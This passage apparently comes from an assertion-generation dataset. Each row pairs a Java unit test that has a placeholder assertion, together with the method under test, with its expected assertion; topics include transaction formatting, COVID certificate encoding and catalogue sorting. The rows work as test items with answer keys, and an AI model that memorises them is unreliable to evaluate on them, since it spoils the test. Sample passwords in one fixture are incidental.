equals(Person p) { if(p != null) { boolean equal = this.idPerson == p.idPerson; equal = equal && this.name.equals(p.name); equal = equal && ( (this.linkedContactUri == null && p.linkedContactUri == null) || (this.linkedContactUri != null && this.linkedContactUri.equals(p.linkedContactUri)) ); equal = equal && ( (this.note == null && p.note == null) || (this.note!= null && this.note.equals(p.note)) ); return equal; } else { return false; }  }"	assertThat(person1.equals(person2), is(true))
"checkEqual_ReturnsFalse() { ""<AssertPlaceHolder>""; }
equals(Person p) { if(p != null) { boolean equal = this.idPerson == p.idPerson; equal = equal && this.name.equals(p.name); equal = equal && ( (this.linkedContactUri == null && p.linkedContactUri == null) || (this.linkedContactUri != null && this.linkedContactUri.equals(p.linkedContactUri)) ); equal = equal && ( (this.note == null && p.note == null) || (this.note!= null && this.note.equals(p.note)) ); return equal; } else { return false; }  }"	assertThat(person1.equals(person3), is(false))
"getSumStatic() { ""<AssertPlaceHolder>""; }
getSum(List<PersonWithTransactions> personWithTransactionsList) { int sum = 0; for (PersonWithTransactions pwt :personWithTransactionsList) { sum+=Transaction.getSum(pwt.transactions); } return sum; }"	assertThat(PersonWithTransactions.getSum(pwtList), is(55))
"getNumberOfItemsStatic() { ""<AssertPlaceHolder>""; }
getNumberOfItems(List<PersonWithTransactions> personWithTransactionsList) { int sum = 0; for (PersonWithTransactions pwt :personWithTransactionsList) { sum+=Transaction.getNumberOfItems(pwt.transactions); } return sum; }"	assertThat(PersonWithTransactions.getNumberOfItems(pwtList), is(110))
"getSum() { ""<AssertPlaceHolder>""; }
getSum() { return Transaction.getSum(this.transactions); }"	assertThat(pwtList.get(0).getSum(), is(1))
"getNumberOfItems() { ""<AssertPlaceHolder>""; }
getNumberOfItems() { return Transaction.getNumberOfItems(this.transactions); }"	assertThat(pwtList.get(0).getNumberOfItems(), is(2))
"getFormattedAmount_positive_signed_Monetary() { String formattedAmount = tMon1.getFormattedAmount(true, 2, locale); ""<AssertPlaceHolder>""; }
getFormattedAmount(boolean signed, int decimals, Locale locale) { int value = signed ? this.amount : Math.abs(this.amount); if (isMonetary) return Transaction.formatMonetaryAmount(value, decimals, locale); else            return Integer.toString(value); }"	"assertThat(formattedAmount, is(""12.34""))"
"getFormattedAmount_positive_unsigned_Monetary() { String formattedAmount = tMon1.getFormattedAmount(false, 2, locale); ""<AssertPlaceHolder>""; }
getFormattedAmount(boolean signed, int decimals, Locale locale) { int value = signed ? this.amount : Math.abs(this.amount); if (isMonetary) return Transaction.formatMonetaryAmount(value, decimals, locale); else            return Integer.toString(value); }"	"assertThat(formattedAmount, is(""12.34""))"
"getFormattedAmount_negative_signed_Monetary() { String formattedAmount = tMon2.getFormattedAmount(true, 2, locale); ""<AssertPlaceHolder>""; }
getFormattedAmount(boolean signed, int decimals, Locale locale) { int value = signed ? this.amount : Math.abs(this.amount); if (isMonetary) return Transaction.formatMonetaryAmount(value, decimals, locale); else            return Integer.toString(value); }"	"assertThat(formattedAmount, is(""-12.34""))"
"getFormattedAmount_negative_unsigned_Monetary() { String formattedAmount = tMon2.getFormattedAmount(false, 2, locale); ""<AssertPlaceHolder>""; }
getFormattedAmount(boolean signed, int decimals, Locale locale) { int value = signed ? this.amount : Math.abs(this.amount); if (isMonetary) return Transaction.formatMonetaryAmount(value, decimals, locale); else            return Integer.toString(value); }"	"assertThat(formattedAmount, is(""12.34""))"
"getFormattedAmount_negative_signed_Thing() { String formattedAmount = tThing1.getFormattedAmount(true, 2, locale); ""<AssertPlaceHolder>""; }
getFormattedAmount(boolean signed, int decimals, Locale locale) { int value = signed ? this.amount : Math.abs(this.amount); if (isMonetary) return Transaction.formatMonetaryAmount(value, decimals, locale); else            return Integer.toString(value); }"	"assertThat(formattedAmount, is(""-1234""))"
"getFormattedAmount_negative_unsigned_Thing() { String formattedAmount = tThing1.getFormattedAmount(false, 2, locale); ""<AssertPlaceHolder>""; }
getFormattedAmount(boolean signed, int decimals, Locale locale) { int value = signed ? this.amount : Math.abs(this.amount); if (isMonetary) return Transaction.formatMonetaryAmount(value, decimals, locale); else            return Integer.toString(value); }"	"assertThat(formattedAmount, is(""1234""))"
"getFormattedAmount_positive_signed_MonetarySmall() { String formattedAmount = tMon3.getFormattedAmount(true, 2, locale); ""<AssertPlaceHolder>""; }
getFormattedAmount(boolean signed, int decimals, Locale locale) { int value = signed ? this.amount : Math.abs(this.amount); if (isMonetary) return Transaction.formatMonetaryAmount(value, decimals, locale); else            return Integer.toString(value); }"	"assertThat(formattedAmount, is(""0.01""))"
"getFormattedAmount_positive_unsigned_MonetarySmall() { String formattedAmount = tMon3.getFormattedAmount(false, 2, locale); ""<AssertPlaceHolder>""; }
getFormattedAmount(boolean signed, int decimals, Locale locale) { int value = signed ? this.amount : Math.abs(this.amount); if (isMonetary) return Transaction.formatMonetaryAmount(value, decimals, locale); else            return Integer.toString(value); }"	"assertThat(formattedAmount, is(""0.01""))"
"getFormattedAmount_positive_signed_Monetary_0dec() { String formattedAmount = tMon1.getFormattedAmount(true, 0, locale); ""<AssertPlaceHolder>""; }
getFormattedAmount(boolean signed, int decimals, Locale locale) { int value = signed ? this.amount : Math.abs(this.amount); if (isMonetary) return Transaction.formatMonetaryAmount(value, decimals, locale); else            return Integer.toString(value); }"	"assertThat(formattedAmount, is(""1234""))"
"getFormattedAmount_positive_signed_Monetary_1dec() { String formattedAmount = tMon1.getFormattedAmount(true, 1, locale); ""<AssertPlaceHolder>""; }
getFormattedAmount(boolean signed, int decimals, Locale locale) { int value = signed ? this.amount : Math.abs(this.amount); if (isMonetary) return Transaction.formatMonetaryAmount(value, decimals, locale); else            return Integer.toString(value); }"	"assertThat(formattedAmount, is(""123.4""))"
"getFormattedAmount_positive_signed_Monetary_3dec() { String formattedAmount = tMon1.getFormattedAmount(true, 3, locale); ""<AssertPlaceHolder>""; }
getFormattedAmount(boolean signed, int decimals, Locale locale) { int value = signed ? this.amount : Math.abs(this.amount); if (isMonetary) return Transaction.formatMonetaryAmount(value, decimals, locale); else            return Integer.toString(value); }"	"assertThat(formattedAmount, is(""1.234""))"
"equals_equal() { ""<AssertPlaceHolder>""; }
equals(Transaction t) { return this.idTransaction == t.idTransaction && this.description.equals(t.description) && this.amount == t.amount && this.isMonetary == t.isMonetary && this.idPerson == t.idPerson && this.timestamp.equals(t.timestamp) && ((!this.isReturned() && !t.isReturned()) || (this.isReturned() && this.timestampReturned.equals(t.timestampReturned)) ) && this.hasImages == t.hasImages; }"	assertThat(tMon1.equals(tMon4), is(true))
"equals_nonequal() { ""<AssertPlaceHolder>""; }
equals(Transaction t) { return this.idTransaction == t.idTransaction && this.description.equals(t.description) && this.amount == t.amount && this.isMonetary == t.isMonetary && this.idPerson == t.idPerson && this.timestamp.equals(t.timestamp) && ((!this.isReturned() && !t.isReturned()) || (this.isReturned() && this.timestampReturned.equals(t.timestampReturned)) ) && this.hasImages == t.hasImages; }"	assertThat(tMon1.equals(tMon2), is(false))
"getSumStatic() { ""<AssertPlaceHolder>""; }
getSum(List<TransactionWithPerson> transactionWithPersonList) { return transactionWithPersonList .stream() .filter(twp -> twp.transaction.isMonetary) .mapToInt(twp -> twp.transaction.amount) .sum(); }"	assertThat(TransactionWithPerson.getSum(twpList), is(55))
"getNumberOfItemsStatic() { ""<AssertPlaceHolder>""; }
getNumberOfItems(List<TransactionWithPerson> transactionWithPersonList) { return transactionWithPersonList == null ? 0 :transactionWithPersonList .stream() .filter(twp -> !twp.transaction.isMonetary) .mapToInt(twp -> Math.abs(twp.transaction.amount)) .sum(); }"	assertThat(TransactionWithPerson.getNumberOfItems(twpList), is(110))
"checkNextInt_1() { ""<AssertPlaceHolder>""; }
nextInt(double d) { return new BigDecimal(Double.toString(d)) .setScale(0, RoundingMode.HALF_UP) .intValue(); }"	assertThat(Utilities.nextInt(4.6*100), is(460))
"testSayHello() { ""<AssertPlaceHolder>""; }
sayHello() { return ""Really appreciate your star, that's the power of our life.""; }"	"assertEquals(""Really appreciate your star, that's the power of our life."", new HelloWorldController().sayHello())"
"Exception {  final Cwt cwt = Cwt.builder().issuer(""SE"").issuedAt(Instant.now()).build(); final CoseSign1_Object sign = CoseSign1_Object.builder() .protectedAttribute(HeaderParameterKey.ALG.getCborObject(), SignatureAlgorithm.PS256.getCborObject()) .protectedAttribute(HeaderParameterKey.KID.getCborObject(), CBORObject.FromObject(getKeyId(this.rsa.getCertificate()))) .content(cwt.encode()) .build();  sign.sign(this.rsa.getPrivateKey(), null);  final byte[] encoding = sign.encode();  CoseSign1_Object object2 = CoseSign1_Object.decode(encoding); object2.verifySignature(this.rsa.getPublicKey());  final Cwt cwt2 = object2.getCwt(); Assert.""<AssertPlaceHolder>""; }
getCwt() throws CBORException { if (this.content == null) { return null; } return Cwt.decode(this.content); }"	"assertEquals(""SE"", cwt2.getIssuer())"
"Exception { SignatureAlgorithm id = SignatureAlgorithm.fromValue(-7); Assert.""<AssertPlaceHolder>""; }
getValue() { return this.value.AsInt32Value(); }"	assertEquals(-7, id.getValue())
"Exception { SignatureAlgorithm id = SignatureAlgorithm.fromValue(-7); Assert.""<AssertPlaceHolder>""; }
getCborObject() { return this.value; }"	assertEquals(CBORObject.FromObject(-7), id.getCborObject())
"Exception { final CBORInstantConverter conv = new CBORInstantConverter();  final Instant now = Instant.now(); final long seconds = now.getEpochSecond();  final CBORObject obj = conv.ToCBORObject(now); Instant instant = conv.FromCBORObject(obj);  Assert.""<AssertPlaceHolder>""; }
FromCBORObject(final CBORObject obj) { if (obj == null) { return null; }  final Date date; if (obj.HasMostOuterTag(0) || obj.HasMostOuterTag(1)) { // We are liberal. Really it should be a numeric untagged date. date = taggedDateConverter.FromCBORObject(obj); } else { date = untaggedDateConverter.FromCBORObject(obj); } return Instant.ofEpochMilli(date.getTime()); }"	assertEquals(seconds, instant.getEpochSecond())
"Exception {  final byte[] data = { 'D', 'A', 'T', 'A' };  final int[] levels = { Deflater.BEST_SPEED, Deflater.DEFAULT_COMPRESSION, Deflater.HUFFMAN_ONLY, Deflater.NO_COMPRESSION };  for (int i = 0; i < levels.length; i++) { final byte[] compressed = testCompress(data, levels[i]); final byte[] decompressed = Zlib.decompress(compressed, true); Assert.""<AssertPlaceHolder>""; } }
decompress(final byte[] data, final boolean requireCompressed) throws ZipException {  final Inflater inflater = new Inflater(); try { try (final ByteArrayInputStream bis = new ByteArrayInputStream(data); final InflaterInputStream iis = new InflaterInputStream(bis, inflater); final ByteArrayOutputStream bos = new ByteArrayOutputStream()) {  final byte[] buffer = new byte[2056]; int len = iis.read(buffer); while (len != -1) { bos.write(buffer, 0, len); len = iis.read(buffer); } bos.flush();  return bos.toByteArray(); } catch (ZipException e) { if (requireCompressed) { throw e; } else { return data; } } catch (IOException e) { throw new UncheckedIOException(e); } } finally { inflater.end(); } }"	assertArrayEquals(data, decompressed)
"testGenerateOption2() { String uvci = UVCIBuilder.builder() .noPrefix() .version(""02"") .country(""SE"") .uniqueString(""123456789ABC"") .build(); Assert.""<AssertPlaceHolder>""; }
build() { if (this.country == null) { throw new IllegalArgumentException(""Country has not been assigned""); } if (this.uniqueString == null) { throw new IllegalArgumentException(""Opaque unique string has not been assigned""); }  StringBuilder sb = new StringBuilder(); if (this.prefix != null) { sb.append(UVCI_PREFIX).append(':'); } sb.append(this.version != null ? this.version : UVCI_VERSION).append(':'); sb.append(this.country).append(':'); if (this.issuer != null) { sb.append(this.issuer).append('/'); } if (this.vaccine != null) { if (this.issuer == null) { throw new IllegalArgumentException( ""Invalid UVCI - If vaccine info is assigned, the issuing entity is also required""); } sb.append(this.vaccine).append('/'); } sb.append(this.uniqueString);  if (this.includeChecksum) { return UVCIChecksumCalculator.addChecksum(sb.toString()); } else { return sb.toString(); } }"	"assertEquals(""02:SE:123456789ABC"", uvci)"
"Exception { final DigitalCovidCertificate dgc = (DigitalCovidCertificate) new DigitalCovidCertificate() .withNam(new PersonName().withGn(""Martin"").withFn(""Lindström"")) .withDob(""1969-11-11"") .withV(Arrays.asList(new VaccinationEntry() .withTg(""840539006"") .withVp(""1119349007"") .withMp(""EU/1/20/1507"") .withMa(""ORG-100030215"") .withDn(Integer.valueOf(1)) .withSd(Integer.valueOf(2)) .withDt(LocalDate.parse(""2021-04-17"")) .withCo(""SE"") .withIs(""Swedish eHealth Agency"") .withCi(""01:SE:JKJKHJGHG6768686HGJGH#M"")));  byte[] encoding = dgc.encode();  DigitalCovidCertificate dgc2 = DigitalCovidCertificate.decode(encoding);  Assert.""<AssertPlaceHolder>""; }
decode(final byte[] cbor) throws DGCSchemaException { try { return cborMapper.readValue(cbor, DigitalCovidCertificate.class); } catch (final IOException e) { throw new DGCSchemaException(""Failed to decode DCC from CBOR encoding"", e); } }"	assertEquals(dgc, dgc2)
"Exception { final DigitalCovidCertificate dgc = (DigitalCovidCertificate) new DigitalCovidCertificate() .withNam(new PersonName().withGn(""Martin"").withFn(""Lindström"")) .withDob(""1969-11-11"") .withV(Arrays.asList(new VaccinationEntry() .withTg(""840539006"") .withVp(""1119349007"") .withMp(""EU/1/20/1507"") .withMa(""ORG-100030215"") .withDn(Integer.valueOf(1)) .withSd(Integer.valueOf(2)) .withDt(LocalDate.parse(""2021-04-17"")) .withCo(""SE"") .withIs(""Swedish eHealth Agency"") .withCi(""01:SE:JKJKHJGHG6768686HGJGH#M"")));  String json = dgc.toJSONString();  DigitalCovidCertificate dgc2 = DigitalCovidCertificate.fromJsonString(json);  Assert.""<AssertPlaceHolder>""; }
fromJsonString(final String json) throws DGCSchemaException { try { return jsonMapper.readValue(json, DigitalCovidCertificate.class); } catch (final IOException e) { throw new DGCSchemaException(""Failed to decode DCC from JSON"", e); } }"	assertEquals(dgc, dgc2)
"Exception {  final String dateTime = ""2021-05-03T20:00:00+02:00"";  // Encode CBORObject tst = CBORObject.NewMap(); tst.set(""co"", CBORObject.FromObject(""SE"")); CBORObject dateObject = CBORObject.FromObject(dateTime); tst.set(""sc"", CBORObject.FromObjectAndTag(dateObject, 0));  byte[] cbor = tst.EncodeToBytes();  // Make sure that our CBOR mapper can handle the offset time TestEntry tst2 = DigitalCovidCertificate.getCBORMapper().readValue(cbor, TestEntry.class);  // Assert that that it is serialized with no offset Assert.""<AssertPlaceHolder>""; }
toString() { return super.toString(); }"	"assertTrue(tst2.getSc().toString().endsWith(""Z""))"
"testMask() { String sql = ""stock_trade:='connector' ="" + "" 'jdbc',useUnicode=yes&characterEncoding=UTF-8&useSSL=false',\\n"" + ""   'username' = 'trade',\\n"" + "" 'password' = 'c6634672b535f968b'\\n"" + "";\\n"" + ""tidb_test:='connector' = 'jdbc',\\n"" + ""'url' ="" + "" 'jdbc:mysql://localhost:4000/test?useUnicode=yes&characterEncoding=UTF-8&useSSL=false',\\n"" + ""   'username' = 'root',\\n"" + "" 'password' = 'wwz@test'\\n"" + "";"";  String out = SecurityAspect.mask(sql, SecurityAspect.SENSITIVE, SecurityAspect.MASK);  Assert.""<AssertPlaceHolder>""; }
mask(String info, String passwordPattern, String mask) { if (null == info || null == passwordPattern || null == mask) { return info; } Pattern p = Pattern.compile(passwordPattern); Matcher m = p.matcher(info); StringBuffer sb = new StringBuffer(); while (m.find()) { m.appendReplacement(sb, mask); } m.appendTail(sb);  return sb.toString(); }"	assertEquals(out.contains(SecurityAspect.MASK), true)
"getStrategyTest() { when(catalogueTreeSortStrategyMap.get(anyString())).thenAnswer(invocationOnMock -> { String strategy = invocationOnMock.getArgument(0); return mockCatalogueTreeSortStrategyMap.get(strategy); });  CatalogueTreeSortStrategy strategy = catalogueTreeSortFactoryTest.getStrategy(""create_time""); ""<AssertPlaceHolder>""; }
getStrategy(String strategyName) { CatalogueTreeSortStrategy catalogueTreeSortStrategy = Safes.of(catalogueTreeSortStrategyMap).get(strategyName); if (Objects.isNull(catalogueTreeSortStrategy)) { log.warn(""Strategy {} is not defined. Use DefaultStrategy"", strategyName); catalogueTreeSortStrategy = Safes.of(catalogueTreeSortStrategyMap).get(CatalogueSortConstant.STRATEGY_DEFAULT); } if (Objects.isNull(catalogueTreeSortStrategy)) { throw new BusException(StrUtil.format(""Strategy {} is not defined."", strategyName)); } return catalogueTreeSortStrategy; }"	assertEquals(catalogueTreeSortCreateTimeStrategy, strategy)
"getStrategyTest2() { when(catalogueTreeSortStrategyMap.get(anyString())).thenAnswer(invocationOnMock -> { String strategy = invocationOnMock.getArgument(0); return mockCatalogueTreeSortStrategyMap.get(strategy); });  CatalogueTreeSortStrategy strategy = catalogueTreeSortFactoryTest.getStrategy(""first_letter""); ""<AssertPlaceHolder>""; }
getStrategy(String strategyName) { CatalogueTreeSortStrategy catalogueTreeSortStrategy = Safes.of(catalogueTreeSortStrategyMap).get(strategyName); if (Objects.isNull(catalogueTreeSortStrategy)) { log.warn(""Strategy {} is not defined. Use DefaultStrategy"", strategyName); catalogueTreeSortStrategy = Safes.of(catalogueTreeSortStrategyMap).get(CatalogueSortConstant.STRATEGY_DEFAULT); } if (Objects.isNull(catalogueTreeSortStrategy)) { throw new BusException(StrUtil.format(""Strategy {} is not defined."", strategyName)); } return catalogueTreeSortStrategy; }"	assertEquals(catalogueTreeSortFirstLetterStrategy, strategy)
"getStrategyIllegalTest() { when(catalogueTreeSortStrategyMap.get(anyString())).thenAnswer(invocationOnMock -> { String strategy = invocationOnMock.getArgument(0); return mockCatalogueTreeSortStrategyMap.get(strategy); });  CatalogueTreeSortStrategy strategy = catalogueTreeSortFactoryTest.getStrategy(""xxx""); ""<AssertPlaceHolder>""; }
getStrategy(String strategyName) { CatalogueTreeSortStrategy catalogueTreeSortStrategy = Safes.of(catalogueTreeSortStrategyMap).get(strategyName); if (Objects.isNull(catalogueTreeSortStrategy)) { log.warn(""Strategy {} is not defined. Use DefaultStrategy"", strategyName); catalogueTreeSortStrategy = Safes.of(catalogueTreeSortStrategyMap).get(CatalogueSortConstant.STRATEGY_DEFAULT); } if (Objects.isNull(catalogueTreeSortStrategy)) { throw new BusException(StrUtil.format(""Strategy {} is not defined."", strategyName)); } return catalogueTreeSortStrategy; }"	assertEquals(defaultStrategy, strategy)
"getStrategyIllegalTest2() { when(catalogueTreeSortStrategyMap.get(anyString())).thenAnswer(invocationOnMock -> { String strategy = invocationOnMock.getArgument(0); return mockCatalogueTreeSortStrategyMap.get(strategy); });  CatalogueTreeSortStrategy strategy = catalogueTreeSortFactoryTest.getStrategy(null); ""<AssertPlaceHolder>""; }
getStrategy(String strategyName) { CatalogueTreeSortStrategy catalogueTreeSortStrategy = Safes.of(catalogueTreeSortStrategyMap).get(strategyName); if (Objects.isNull(catalogueTreeSortStrategy)) { log.warn(""Strategy {} is not defined. Use DefaultStrategy"", strategyName); catalogueTreeSortStrategy = Safes.of(catalogueTreeSortStrategyMap).get(CatalogueSortConstant.STRATEGY_DEFAULT); } if (Objects.isNull(catalogueTreeSortStrategy)) { throw new BusException(StrUtil.format(""Strategy {} is not defined."", strategyName)); } return catalogueTreeSortStrategy; }"	assertEquals(defaultStrategy, strategy)
"sortAscTest() { SortTypeEnum sortTypeEnum = SortTypeEnum.ASC; List<Catalogue> catalogueTree = Lists.newArrayList(); Catalogue catalogue = new Catalogue(); catalogue.setId(1); catalogue.setCreateTime(LocalDateTime.of(2024, 4, 28, 19, 22, 0));  Catalogue catalogue11 = new Catalogue(); catalogue11.setId(2); catalogue11.setCreateTime(LocalDateTime.of(2024, 4, 28, 20, 22, 0)); Catalogue catalogue12 = new Catalogue(); catalogue12.setId(3); catalogue12.setCreateTime(LocalDateTime.of(2024, 4, 28, 21, 22, 0)); catalogue.setChildren(Lists.newArrayList(catalogue12, catalogue11));  Catalogue catalogue2 = new Catalogue(); catalogue2.setId(4); catalogue2.setCreateTime(LocalDateTime.of(2024, 4, 29, 19, 22, 0));  Catalogue catalogue21 = new Catalogue(); catalogue21.setId(7); catalogue21.setCreateTime(LocalDateTime.of(2024, 4, 29, 21, 22, 0)); Catalogue catalogue22 = new Catalogue(); catalogue22.setId(6); catalogue22.setCreateTime(LocalDateTime.of(2024, 4, 29, 20, 22, 0)); catalogue2.setChildren(Lists.newArrayList(catalogue21, catalogue22));  catalogueTree.add(catalogue2); catalogueTree.add(catalogue);  /* input: -- 4 (2024-04-29 19:22:00) -- 7 (2024-04-29 21:22:00) -- 6 (2024-04-29 20:22:00) -- 1 (2024-04-28 19:22:00) -- 3 (2024-04-28 21:22:00) -- 2 (2024-04-28 20:22:00)  output: -- 1 (2024-04-28 19:22:00) -- 2 (2024-04-28 20:22:00) -- 3 (2024-04-28 21:22:00) -- 4 (2024-04-29 19:22:00) -- 6 (2024-04-29 20:22:00) -- 7 (2024-04-29 21:22:00) */ List<Catalogue> resultList = catalogueTreeSortCreateTimeStrategyTest.sort(catalogueTree, sortTypeEnum); List<Integer> resultIdList = CategoryTreeSortStrategyTestUtils.breadthTraverse(resultList); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug( ""sort catalogue tree based on creation time. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); return recursionSortCatalogues(catalogueTree, sortTypeEnum); }"	assertEquals(Lists.newArrayList(1, 4, 2, 3, 6, 7), resultIdList)
"sortDescTest() { SortTypeEnum sortTypeEnum = SortTypeEnum.DESC; List<Catalogue> catalogueTree = Lists.newArrayList(); Catalogue catalogue = new Catalogue(); catalogue.setId(1); catalogue.setCreateTime(LocalDateTime.of(2024, 4, 28, 19, 22, 0));  Catalogue catalogue11 = new Catalogue(); catalogue11.setId(2); catalogue11.setCreateTime(LocalDateTime.of(2024, 4, 28, 20, 22, 0)); Catalogue catalogue12 = new Catalogue(); catalogue12.setId(3); catalogue12.setCreateTime(LocalDateTime.of(2024, 4, 28, 21, 22, 0)); catalogue.setChildren(Lists.newArrayList(catalogue12, catalogue11));  Catalogue catalogue2 = new Catalogue(); catalogue2.setId(4); catalogue2.setCreateTime(LocalDateTime.of(2024, 4, 29, 19, 22, 0));  Catalogue catalogue21 = new Catalogue(); catalogue21.setId(7); catalogue21.setCreateTime(LocalDateTime.of(2024, 4, 29, 21, 22, 0)); Catalogue catalogue22 = new Catalogue(); catalogue22.setId(6); catalogue22.setCreateTime(LocalDateTime.of(2024, 4, 29, 20, 22, 0)); catalogue2.setChildren(Lists.newArrayList(catalogue21, catalogue22));  catalogueTree.add(catalogue2); catalogueTree.add(catalogue);  /* input: -- 4 (2024-04-29 19:22:00) -- 7 (2024-04-29 21:22:00) -- 6 (2024-04-29 20:22:00) -- 1 (2024-04-28 19:22:00) -- 3 (2024-04-28 21:22:00) -- 2 (2024-04-28 20:22:00)  output: -- 4 (2024-04-29 19:22:00) -- 7 (2024-04-29 21:22:00) -- 6 (2024-04-29 20:22:00) -- 1 (2024-04-28 19:22:00) -- 3 (2024-04-28 21:22:00) -- 2 (2024-04-28 20:22:00) */ List<Catalogue> resultList = catalogueTreeSortCreateTimeStrategyTest.sort(catalogueTree, sortTypeEnum); List<Integer> resultIdList = CategoryTreeSortStrategyTestUtils.breadthTraverse(resultList); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug( ""sort catalogue tree based on creation time. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); return recursionSortCatalogues(catalogueTree, sortTypeEnum); }"	assertEquals(Lists.newArrayList(4, 1, 7, 6, 3, 2), resultIdList)
"sortEmptyTest() { List<Catalogue> catalogueTree = Lists.newArrayList(); SortTypeEnum sortTypeEnum = SortTypeEnum.ASC;  List<Catalogue> resultList = catalogueTreeSortCreateTimeStrategyTest.sort(catalogueTree, sortTypeEnum); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug( ""sort catalogue tree based on creation time. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); return recursionSortCatalogues(catalogueTree, sortTypeEnum); }"	assertEquals(Lists.newArrayList(), resultList)
"sortEmptyTest2() { List<Catalogue> catalogueTree = null; SortTypeEnum sortTypeEnum = SortTypeEnum.ASC;  List<Catalogue> resultList = catalogueTreeSortCreateTimeStrategyTest.sort(catalogueTree, sortTypeEnum); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug( ""sort catalogue tree based on creation time. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); return recursionSortCatalogues(catalogueTree, sortTypeEnum); }"	assertEquals(Lists.newArrayList(), resultList)
"sortAscTest() { SortTypeEnum sortTypeEnum = SortTypeEnum.ASC; List<Catalogue> catalogueTree = Lists.newArrayList(); Catalogue catalogue = new Catalogue(); catalogue.setId(1);  Catalogue catalogue11 = new Catalogue(); catalogue11.setId(2); Catalogue catalogue12 = new Catalogue(); catalogue12.setId(3); catalogue.setChildren(Lists.newArrayList(catalogue12, catalogue11));  Catalogue catalogue2 = new Catalogue(); catalogue2.setId(4);  Catalogue catalogue21 = new Catalogue(); catalogue21.setId(7); Catalogue catalogue22 = new Catalogue(); catalogue22.setId(6); catalogue2.setChildren(Lists.newArrayList(catalogue21, catalogue22));  catalogueTree.add(catalogue2); catalogueTree.add(catalogue);  /* input: -- 4 -- 7 -- 6 -- 1 -- 3 -- 2  output: -- 1 -- 2 -- 3 -- 4 -- 6 -- 7 */ List<Catalogue> resultList = catalogueTreeSortDefaultStrategyTest.sort(catalogueTree, sortTypeEnum); List<Integer> resultIdList = CategoryTreeSortStrategyTestUtils.breadthTraverse(resultList); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug(""sort catalogue tree based on id. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); return recursionSortCatalogues(catalogueTree, sortTypeEnum); }"	assertEquals(Lists.newArrayList(1, 4, 2, 3, 6, 7), resultIdList)
"sortDescTest() { SortTypeEnum sortTypeEnum = SortTypeEnum.DESC; List<Catalogue> catalogueTree = Lists.newArrayList(); Catalogue catalogue = new Catalogue(); catalogue.setId(1);  Catalogue catalogue11 = new Catalogue(); catalogue11.setId(2); Catalogue catalogue12 = new Catalogue(); catalogue12.setId(3); catalogue.setChildren(Lists.newArrayList(catalogue12, catalogue11));  Catalogue catalogue2 = new Catalogue(); catalogue2.setId(4);  Catalogue catalogue21 = new Catalogue(); catalogue21.setId(7); Catalogue catalogue22 = new Catalogue(); catalogue22.setId(6); catalogue2.setChildren(Lists.newArrayList(catalogue21, catalogue22));  catalogueTree.add(catalogue2); catalogueTree.add(catalogue);  /* input: -- 4 -- 7 -- 6 -- 1 -- 3 -- 2  output: -- 4 -- 7 -- 6 -- 1 -- 3 -- 2 */ List<Catalogue> resultList = catalogueTreeSortDefaultStrategyTest.sort(catalogueTree, sortTypeEnum); List<Integer> resultIdList = CategoryTreeSortStrategyTestUtils.breadthTraverse(resultList); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug(""sort catalogue tree based on id. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); return recursionSortCatalogues(catalogueTree, sortTypeEnum); }"	assertEquals(Lists.newArrayList(4, 1, 7, 6, 3, 2), resultIdList)
"sortEmptyTest() { List<Catalogue> catalogueTree = Lists.newArrayList(); SortTypeEnum sortTypeEnum = SortTypeEnum.ASC;  List<Catalogue> resultList = catalogueTreeSortDefaultStrategyTest.sort(catalogueTree, sortTypeEnum); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug(""sort catalogue tree based on id. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); return recursionSortCatalogues(catalogueTree, sortTypeEnum); }"	assertEquals(Lists.newArrayList(), resultList)
"sortEmptyTest2() { List<Catalogue> catalogueTree = null; SortTypeEnum sortTypeEnum = SortTypeEnum.ASC;  List<Catalogue> resultList = catalogueTreeSortDefaultStrategyTest.sort(catalogueTree, sortTypeEnum); ""<AssertPlaceHolder>""; }
sort(List<Catalogue> catalogueTree, SortTypeEnum sortTypeEnum) { log.debug(""sort catalogue tree based on id. catalogueTree: {}, sortTypeEnum: {}"", catalogueTree, sortTypeEnum); return recursionSortCatalogues(catalogueTree, sortTypeEnum); }"	assertEquals(Lists.newArrayList(), resultList)
"sortAscTest() { SortTypeEnum sortTypeEnum = SortTypeEnum.ASC; List<Catalogue> catalogueTree = Lists.newArrayList(); Catalogue catalogue = new Catalogue(); catalogue.setId(1); catalogue.setName(""测试目录""); catalogue.setCreateTime(LocalDateTime.of(2024, 4, 28, 19, 22, 0));  Catalogue catalogue11 = new Catalogue(); catalogue11.setId(2); catalogue11.setName(""bbb""); catalogue11.setCreateTime(LocalDateTime.of(2024, 4, 28, 20, 22, 0)); Catalogue catalogue12 = new Catalogue(); catalogue12.setId(3); catalogue12.setName(""aaa""); catalogue12.setCreateTime(LocalDateTime.of(2024, 4, 28, 21, 22, 0)); catalogue.setChildren(Lists.newArrayList(catalogue12, catalogue11));  Catalogue catalogue2 = new Catalogue(); catalogue2.setId(4); catalogue2.setName(""test""); catalogue2.setCreateTime(LocalDateTime.of(2024, 4, 29, 19, 22, 0));  Catalogue catalogue21 = new Catalogue(); catalogue21.setId(7); catalogue21.setName(""测试目录2""); catalogue21.setCreateTime(LocalDateTime.of(2024, 4, 29, 21, 22, 0)); Catalogue catalogue22 = new Catalogue(); catalogue22.setId(6); catalogue22.setName(""生产任务""); catalogue22.setCreateTime(LocalDateTime.of(2024, 4, 29, 20, 22, 0)); catalogue2.setChildren(Lists.newArrayList(catalogue21, catalogue22));  catalogueTree.add(catalogue2); catalogueTree.add(catalogue);  /* input: -- 4 (2024-04-29 19:22:00) (test) 